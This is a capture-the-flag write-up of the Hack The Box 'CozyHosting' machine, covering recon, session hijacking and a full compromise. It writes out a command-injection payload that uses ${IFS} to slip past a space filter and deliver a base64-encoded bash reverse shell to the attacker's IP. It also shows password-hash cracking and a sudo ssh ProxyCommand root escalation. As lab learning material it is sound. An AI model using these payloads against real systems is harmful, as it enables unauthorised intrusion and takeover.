# CozyHosting
We(My friend Bryan and I) decided to try and do an active box for a change. See how difficult they are compared to retired. Sadly, this was somewhat of a challenge.

Despite needing hints, this was a great learning experience I hopefully can share in my notes.

Want to start of paying my respects to [Vikas Sharma](https://psychovik.medium.com/hack-the-box-cozy-hosting-8d17ed0e2304) and his write-up. We relied on it once we got stuck.


Metadata:
- OS: Linux
- Difficulty: Easy
- Status: Active
- IP: 10.10.11.230

## Recon
```bash
sudo nmap -p- -sC -sV $TARGET --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-19 14:49 CST
Nmap scan report for 10.10.11.230
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.18 seconds
```

## Navigating the website
Upon viewing the website, we see it is a CMS based site with a `/login` page. Nothing major stood out for us. We tried to look up vulnerabilities for the CMS, but came up with nothing.

So next stage for us, we run dirbuster to see if we find anything of value.

### Dirbuster
Up and till this point, dirbuster hasn't been very useful. This time was different - we actually found a non-auth'd page that had something special.

`/actuator/sessions` was found by dirbuster. When we navigated to it in the browser we saw there were JSESSIONID's. One set for a user named: `kanderson`.

With a little googling, we realized this is used as a session cookie for authenticated users. Time to start burp suite

### Burp
After a little configuring, we got interceptor working on firefox. And navigated to `/admin` where we manually set the JSESSIONID on every request.

`Cookie: JSESSIONID=C7706D2323F4E0940EAF4753D52E9C3E`

After intercepting and changing each cookie to `kanderson`, we got access to the `/admin` page.


## Access
This is where we eventually got stuck and had to rely on a write-up. So instead of just stealing someone else's work. I'll try to add detail as to what I learned. I think that might be more useful.

The admin page had two textboxes attached to a form. First textbox being hostname and second username. I think the page was supposed to provide admin users the ability to connect to boxes they controlled from this website? The one thing we noticed was you could escape the text box and get an error from the commandline. Which meant this text field was getting executed as a bash command. Probably what made this box an easy since you had easy access to the commandline. The problem we struggled with is shown below. The website would not allow space characters (we even tried url encoding them, but with no success). So we needed to find a way to run a command without spaces. Or what we learned today, with the `${IFS}` variable.

Apparently, `${IFS}` gets converted to a space in the terminal. Super powerful feature I didn't know existed. So now we have a way to string an actual command. Let's try and get a shell. This is where we were impressed with the solution provided by Vikas.

First, he shows how to convert a bash command into base64 encoded string. Then provides us a nifty one-liner that echos, decodes and executes the encoded bash command.
```bash
# First we encode to a string (10.10.14.12 is my IP and 4444 is the port I leave open waiting for the victim to connect to)
echo "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1" | base64 -w 0
# output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjEK%
# Then we embed the string in the payload and send it!
'';echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjEK%"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```


### full payload
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 429
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=C7706D2323F4E0940EAF4753D52E9C3E
Upgrade-Insecure-Requests: 1

host=127.0.0.1&username='';echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjEK%"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```
Not shown, but we URL encoded the payload to avoid issues with sending the data to the server. We also made sure our attacker box had a netcat listener up.

`nc -lvnp 4444`

Send the request using Burp, and boom. I have a shell.

### Shell access as App user
We stabilize the shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Since we already looked at the solution, we saw the key weakness is in the `app/cloudhosting-0.0.1.jar` file. After some googling, realized this compressed java file contains the configuration for the Spring Boot application hosting this website.

We installed `jd-gui` and copied the file over to us. `python -m http.server` then curl it from my kali box.

After some naviagating and searching inside `jd-gui` we find this info:
```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
So now that we have the password, we connect to the database and see what we can find. Since we had the write-up in front of us, we saw that the passwords were poorly encrypted. This is why Salt and hashing passwords is critical!
```
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
psql -h 127.0.0.1 -U postgres
Password for user

select * from users;

   name    |                           password                           | role

-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```
So we put the passwords into a file called `hash.txt` and put through John the ripper.
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
```
Now that we have a password, we just need to try it. Doesn't appear to work for `admin` or `root`, but it does appear to work for `josh`

### User Flag
`ssh josh@10.10.11.230` with the password of `manchesterunited`. Boom `cat /home/josh/user.txt`.


### Root Flag (ugh, privilege escalation).
We followed Vikas and tried to run `sudo -l`: interesting, the user can sudo ssh. Then we were dumbfounded by `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` gives us root access. Might need to take some time trying to better understand why this works.

But once we run it, we have root access and get the root flag. `cat /root/root.txt`.

I'm going to try and spend some time trying to figure out how the ssh command works, because it is fascinating to me.
https://gtfobins.github.io/gtfobins/ssh/#sudo
